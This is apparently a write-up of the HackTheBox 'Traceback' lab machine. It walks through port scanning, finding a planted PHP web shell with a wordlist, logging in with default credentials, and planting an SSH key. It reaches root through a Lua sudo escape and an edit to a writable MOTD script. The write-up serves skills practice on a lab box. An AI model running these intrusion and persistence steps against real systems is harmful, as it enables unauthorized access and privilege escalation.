# HackTheBox - Traceback

![](/home/strawhack/Videos/Git/TraceBack/Image/1.png)



HackTheBox also called as HTB in short, is a platform which host a  large number of vulnerable machines. This gives opportunity for  students, pen-tester, researchers and other enthusiast to carry out  pen-testing to improve their skills. The aim of the vulnerable box is to exploit the various vulnerabilities present on the box and to obtain  the User and Root flag.

Today we are going to look at a box named Traceback which is created by Xh4H. The box is rated as easy on HTB platform and is based on Linux OS.



## Initial Scanning

Lets use the tool named Nmap to check the open ports on the target machine.

```bash
nmap -sC -sV 10.10.10.181
Nmap scan report for 10.10.10.181
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 (RSA)
|   256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d (ECDSA)
|_  256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Help us
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

From the above Nmap result, we see two ports are open viz Port 22 and Port 80.

Port 80 is Open, So lets open using browser



![](/home/strawhack/Videos/Git/TraceBack/Image/2.png)

We see a message saying, the Website has been owned and a backdoor has been left on the Web Server.

Checking the View-Source of the web page

```html
<!DOCTYPE html>
<html>
<head>
	<title>Help us</title>
	<style type="text/css">
		@-webkit-keyframes blinking {
			0%	 { background-color: #fff; }
			49% { background-color: #fff; }
			50% { background-color: #000; }
			99% { background-color: #000; }
			100% { background-color: #fff; }
		}
		@-moz-keyframes blinking {
			0%	 { background-color: #fff; }
			49% { background-color: #fff; }
			50% { background-color: #000; }
			99% { background-color: #000; }
			100% { background-color: #fff; }
		}
		@keyframes blinking {
			0%	 { background-color: #fff; }
			49% { background-color: #fff; }
			50% { background-color: #000; }
			99% { background-color: #000; }
			100% { background-color: #fff; }
		}
		body {
			-webkit-animation: blinking 12.5s infinite;
			-moz-animation: blinking 12.5s infinite;
			animation: blinking 12.5s infinite;
			color: red;
		}
		
	</style>
</head>
<body>
	<center>
		<h1>This site has been owned</h1>
		<h2>I have left a backdoor for all the net. FREE INTERNETZZZ</h2>
		<h3> - Xh4H - </h3>
		<!--Some of the best web shells that you might need ;)-->
	</center>
</body>
</html>

```

From the above, we get a clue as to which backdoor may have been left behind on the Web Server.

When we do a google search for __"Some of the best web shells that you might need"__, we find Git Repo of the __Xh4H__ as shown below

![](/home/strawhack/Videos/Git/TraceBack/Image/3.png)

From the Git, we find there are several backdoor. Making a word-list,  we get the following list.

```css
alfa3.php
alfav3.0.1.php
andela.php
bloodsecv4.php
by.php
c99ud.php
cmd.php
configkillerionkros.php
jspshell.jsp
mini.php
obfuscated-punknopass.php
punk-nopass.php
punkholic.php
r57.php
smevk.php
wso2.8.5.php
```

Lets brute force using the tool named Gobuster with above word-list

```bash
gobuster dir -u http://10.10.10.181 -w wordlist.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.181
[+] Threads:        10
[+] Wordlist:       wordlist.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/08/13 14:57:28 Starting gobuster
===============================================================
/smevk.php (Status: 200)
===============================================================
2020/08/13 14:57:34 Finished
===============================================================

```

We get a hit for __"smevk.php"__. Opening the website http://10.10.10.181/smevk.php

![](/home/strawhack/Videos/Git/TraceBack/Image/4.png)

We see a login page. Checking the Git Repo for [smevk.php](https://github.com/Xh4H/Web-Shells/blob/master/smevk.php), we find the Username and Password.

```bash
<?php 
/*
SmEvK_PaThAn Shell v3 Coded by Kashif Khan .
https://www.facebook.com/smevkpathan
smevkpathan@gmail.com
Edit Shell according to your choice.
Domain read bypass.
Enjoy!
*/
//Make your setting here.
$deface_url = 'http://pastebin.com/raw.php?i=FHfxsFGT';  //deface url here(pastebin).
$UserName = "admin";                                      //Your UserName here.
$auth_pass = "admin";                                  //Your Password.
//Change Shell Theme here//
$color = "#8B008B";                                   //Fonts color modify here.
$Theme = '#8B008B';                                    //Change border-color accoriding to your choice.
$TabsColor = '#0E5061';                              //Change tabs color here.
#-------------------------------------------------------------------------------
```

```css
Username:admin
Password:admin
```

With the above credentials, we can login through the backdoor and we have access to the web server.

![](/home/strawhack/Videos/Git/TraceBack/Image/5.png)

From the above screen, we are logged in as user __"Webadmin"__. We are able to access the home directory of Webadmin. 

![](/home/strawhack/Videos/Git/TraceBack/Image/6.png)

There is a .ssh folder in Webadmin home directory. To get a proper shell, lets generate a SSH-key pair.

```bash
ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/strawhack/.ssh/id_rsa): webadmin
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in webadmin
Your public key has been saved in webadmin.pub
The key fingerprint is:
SHA256:iGH+zcxDNGEtv0LIAUbz//yAQpvUVpghID2/2i5TmaE strawhack@linux
The key's randomart image is:
+---[RSA 3072]----+
|  .o*o. +.       |
|   ooo.o.=.      |
|    o+.o=o.      |
|   o o==.o.      |
|    o.+*S  .     |
|    E+=X.+.      |
|     += B.+      |
|    + .. . o     |
|     +.     .    |
+----[SHA256]-----+
```

Copy the webadmin.pub key in Authorized_keys.

![](/home/strawhack/Videos/Git/TraceBack/Image/8.png)

![](/home/strawhack/Videos/Git/TraceBack/Image/9.png)

With our public key copied in /home/webadmin/.ssh/authorized_keys, we can login as webadmin using SSH.

```css
ssh -i webadmin webadmin@10.10.10.181
#################################
-------- OWNED BY XH4H  ---------
- I guess stuff could have been configured better ^^ -
#################################

Welcome to Xh4H land


Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Thu Feb 27 06:29:02 2020 from 10.10.14.3
webadmin@traceback:~$ ls -la
total 44
drwxr-x--- 5 webadmin sysadmin 4096 Mar 16 04:03 .
drwxr-xr-x 4 root     root     4096 Aug 25  2019 ..
-rw------- 1 webadmin webadmin  105 Mar 16 04:03 .bash_history
-rw-r--r-- 1 webadmin webadmin  220 Aug 23  2019 .bash_logout
-rw-r--r-- 1 webadmin webadmin 3771 Aug 23  2019 .bashrc
drwx------ 2 webadmin webadmin 4096 Aug 23  2019 .cache
drwxrwxr-x 3 webadmin webadmin 4096 Aug 24  2019 .local
-rw-rw-r-- 1 webadmin webadmin    1 Aug 25  2019 .luvit_history
-rw-rw-r-- 1 sysadmin sysadmin  122 Mar 16 03:53 note.txt
-rw-r--r-- 1 webadmin webadmin  807 Aug 23  2019 .profile
drwxrwxr-x 2 webadmin webadmin 4096 Feb 27 06:29 .ssh
```

Checking the content of note.txt

```css
webadmin@traceback:~$ ls
note.txt
webadmin@traceback:~$ cat note.txt
- sysadmin -
I have left a tool to practice Lua.
I'm sure you know where to find it.
Contact me if you have any question.
```

Checking for sudo permission, we get

```ruby
webadmin@traceback:~$ sudo -l
Matching Defaults entries for webadmin on traceback:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User webadmin may run the following commands on traceback:
    (sysadmin) NOPASSWD: /home/sysadmin/luvit
```

We can read .bash_history

```ruby
webadmin@traceback:~$ cat .bash_history
ls -la
sudo -l
nano privesc.lua
sudo -u sysadmin /home/sysadmin/luvit privesc.lua
rm privesc.lua
logout
```

Since sysadmin can execute luvit without a password, and from [Gtfobins](https://gtfobins.github.io/gtfobins/lua/) for lua, we can do the following

```bash
sudo -u sysadmin /home/sysadmin/luvit
Welcome to the Luvit repl!
> os.execute("/bin/sh")
$ /bin/bash -i
sysadmin@traceback:~$

```

We find the user.txt in the home directory of sysadmin

```ruby
sysadmin@traceback:/home/sysadmin$ cat user.txt
fd6186ad24c8547bc98-------------
```

### Privilege Escalation

Running [linpeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) we find the following information. 

```ruby
[+] Interesting GROUP writable files (not in Home)
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files
  Group sysadmin:
/etc/update-motd.d/50-motd-news
/etc/update-motd.d/10-help-text
/etc/update-motd.d/91-release-upgrade
/etc/update-motd.d/00-header
/etc/update-motd.d/80-esm
/home/sysadmin/linpeas.sh
/home/sysadmin/luvit
/home/sysadmin/.local
/home/sysadmin/pspy64.dms
```

The result especially /etc/update-motd.d/ can be used gain access as root. Checking the permission of /etc/update-motd.d

```ruby
sysadmin@traceback:/etc/update-motd.d$ ls -la
total 32
drwxr-xr-x  2 root sysadmin 4096 Aug 27  2019 .
drwxr-xr-x 80 root root     4096 Mar 16 03:55 ..
-rwxrwxr-x  1 root sysadmin  981 Aug 13 06:57 00-header
-rwxrwxr-x  1 root sysadmin  982 Aug 13 06:57 10-help-text
-rwxrwxr-x  1 root sysadmin 4264 Aug 13 06:57 50-motd-news
-rwxrwxr-x  1 root sysadmin  604 Aug 13 06:57 80-esm
-rwxrwxr-x  1 root sysadmin  299 Aug 13 06:57 91-release-upgrade
```

Sysadmin has write access for above file. Lets edit 00-header as shown below and relogin using webadmin using SSH.

Using Nano editor, we edit 00-header file as shown below.

```bash
 nano 00-header
Unable to create directory /home/webadmin/.local/share/nano/: Permission denied
It is required for saving/loading search history or cursor positions.

Press Enter to continue

sysadmin@traceback:/etc/update-motd.d$ cat 00-header
#!/bin/sh
#
#    00-header - create the header of the MOTD
#    Copyright (C) 2009-2010 Canonical Ltd.
#
#    Authors: Dustin Kirkland <kirkland@canonical.com>
#
#    This program is free software; you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation; either version 2 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License along
#    with this program; if not, write to the Free Software Foundation, Inc.,
#    51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.

[ -r /etc/lsb-release ] && . /etc/lsb-release

echo "\nWelcome to Xh4H land \n"
echo "\n Hacked by Strawhack \n"

```

When we relogin in new terminal with webadmin we see the following message

```bash
ssh -i webadmin webadmin@10.10.10.181
#################################
-------- OWNED BY XH4H  ---------
- I guess stuff could have been configured better ^^ -
#################################

Welcome to Xh4H land


Hacked by Strawhack


Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Thu Aug 13 18:12:50 2020 from 10.10.17.246

```

Copying the authorized_keys from webadmin to root

```bash
sysadmin@traceback:/etc/update-motd.d$ cat 00-header
#!/bin/sh
#
#    00-header - create the header of the MOTD
#    Copyright (C) 2009-2010 Canonical Ltd.
#
#    Authors: Dustin Kirkland <kirkland@canonical.com>
#
#    This program is free software; you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation; either version 2 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License along
#    with this program; if not, write to the Free Software Foundation, Inc.,
#    51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.

[ -r /etc/lsb-release ] && . /etc/lsb-release


echo "\nWelcome to Xh4H land \n"
cp /home/webadmin/.ssh/authorized_keys /root/.ssh/
```

```bash
ssh -i webadmin root@10.10.10.181
#################################
-------- OWNED BY XH4H  ---------
- I guess stuff could have been configured better ^^ -
#################################

Welcome to Xh4H land



Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Fri Jan 24 03:43:29 2020
root@traceback:~# cat root.txt
d498a4609e27263ea---------------

```



## Reference

| Description              | Web URI                                                      |
| ------------------------ | ------------------------------------------------------------ |
| For generating Wordlist  | https://github.com/Xh4H/web-shells                           |
| Lua Privilege Escalation | https://gtfobins.github.io/gtfobins/lua/                     |
| Linpeas.sh               | https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite |

